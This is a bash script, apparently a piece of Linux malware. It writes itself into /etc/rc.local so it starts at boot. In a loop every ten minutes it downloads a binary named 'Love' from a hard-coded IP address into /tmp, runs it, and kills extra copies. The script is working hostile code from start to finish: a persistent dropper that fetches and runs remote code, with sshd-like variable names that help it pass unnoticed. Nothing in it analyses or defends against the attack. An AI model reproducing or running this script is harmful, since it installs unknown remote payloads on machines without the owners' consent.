#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qun:10776622
#                2016-06-14

if [ "sh /etc/chongfu.sh &" = "$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/chongfu.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "/tmp/Love" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "/tmp/Love" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P . http://49.235.238.111/Love
                ./wget -P /tmp/  http://49.235.238.111/Love &> /dev/null
                chmod 755 /tmp/Love
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/Love &
        #./Love &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "Love" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/Love" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/Love" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P .  http://49.235.238.111/Love
                ./wget -P /tmp/  http://49.235.238.111/Love &> /dev/null
                chmod 755 /tmp/Love
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/Love &
        #./Love &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "Love" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 600
done

